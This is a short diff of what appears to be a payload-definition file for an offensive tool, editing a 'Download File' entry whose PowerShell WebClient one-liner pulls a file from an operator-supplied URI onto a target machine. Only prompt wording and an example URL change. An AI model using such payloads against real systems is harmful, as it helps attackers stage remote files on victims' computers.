@@ -155,10 +155,10 @@ Load({
 
 Load({
 	title: "Download File",
-	payload: '(new-object system.net.webclient).downloadFile("<PROMPT (URI)>","<PROMPT (storage path)>")',
+	payload: '(new-object system.net.webclient).downloadFile("<PROMPT (URI)>","<PATH must include name of file>")',
 	category: "Powershell",
 	callback: function(bro){
-	    question("What is the full URI path of the hosted file? (ex: http://foo.bar/bro.exe)")
+	    question("What is the full URI path of the hosted file? (ex: http://foo.bar/bro.zip)")
 	    ask.some(questions, bro);
 
 	}
